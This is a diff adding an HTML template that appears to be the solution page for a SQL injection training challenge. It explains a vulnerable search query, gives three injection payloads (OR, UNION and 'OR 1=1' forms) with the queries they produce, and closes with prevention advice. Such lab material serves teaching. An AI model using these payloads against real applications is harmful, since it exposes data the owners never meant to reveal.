@@ -1,0 +1,121 @@
+{% extends 'base.html' %}
+
+{% block title %}SQL Injection Level 2 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SQL Injection Level 2 Solution: SQL Injection in Search</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates a SQL injection vulnerability in a product search feature. The application directly concatenates user input into SQL queries without proper sanitization, allowing an attacker to manipulate the query to reveal hidden products.
+                    </p>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-bug-fill me-2"></i>Vulnerability Explanation</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>
+                            The vulnerability exists because the application constructs an SQL query by directly concatenating user input:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>query = "SELECT id, name, category, price FROM products WHERE name LIKE '%" + search_term + "%'"</code></pre>
+                        <p>
+                            This allows an attacker to manipulate the query's structure by injecting SQL code. When the application executes this query, the injected SQL becomes part of the command, potentially changing its behavior.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>There are several ways to exploit this vulnerability to find the hidden product with ID 42:</p>
+                        
+                        <h6>1. Using OR with Product ID</h6>
+                        <p>
+                            Enter the following in the search field:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>' OR id=42 OR name LIKE '%</code>
+                        </div>
+                        <p>
+                            This transforms the query to:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>SELECT id, name, category, price FROM products WHERE name LIKE '%' OR id=42 OR name LIKE '%'</code></pre>
+                        <p>
+                            This query will return all products (because <code>name LIKE '%'</code> matches everything) plus the product with ID 42, even if it would normally be hidden from search results.
+                        </p>
+                        
+                        <h6>2. Using UNION to Combine Results</h6>
+                        <p>
+                            Enter the following in the search field:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>' UNION SELECT id, name, category, price FROM products WHERE id=42 --</code>
+                        </div>
+                        <p>
+                            This transforms the query to:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>SELECT id, name, category, price FROM products WHERE name LIKE '%' UNION SELECT id, name, category, price FROM products WHERE id=42 -- %'</code></pre>
+                        <p>
+                            This query uses a UNION to combine the regular search results with the specific product that has ID 42.
+                        </p>
+                        
+                        <h6>3. Using OR with Always True Condition</h6>
+                        <p>
+                            Enter the following in the search field:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>' OR 1=1 --</code>
+                        </div>
+                        <p>
+                            This transforms the query to:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>SELECT id, name, category, price FROM products WHERE name LIKE '%' OR 1=1 -- %'</code></pre>
+                        <p>
+                            This will return all products in the database because <code>1=1</code> is always true. If the product with ID 42 is in the database, it will be included in the results.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-shield-fill-check me-2"></i>Prevention</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To prevent SQL injection vulnerabilities in search features, developers should:</p>
+                        <ol>
+                            <li>
+                                <strong>Use Parameterized Queries:</strong> Instead of concatenating strings, use prepared statements with parameter binding.
+                                <pre class="bg-light p-3 rounded"><code>cursor.execute("SELECT id, name, category, price FROM products WHERE name LIKE ?", ('%' + search_term + '%',))</code></pre>
+                            </li>
+                            <li>
+                                <strong>Use an ORM (Object-Relational Mapping):</strong> ORMs like SQLAlchemy handle parameter sanitization automatically.
+                                <pre class="bg-light p-3 rounded"><code>products = session.query(Product).filter(Product.name.like('%' + search_term + '%')).all()</code></pre>
+                            </li>
+                            <li>
+                                <strong>Input Validation:</strong> Validate and sanitize all user inputs before using them in queries.
+                            </li>
+                            <li>
+                                <strong>Implement Proper Access Controls:</strong> Ensure that users can only access data they are authorized to see, regardless of the query used.
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level2') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
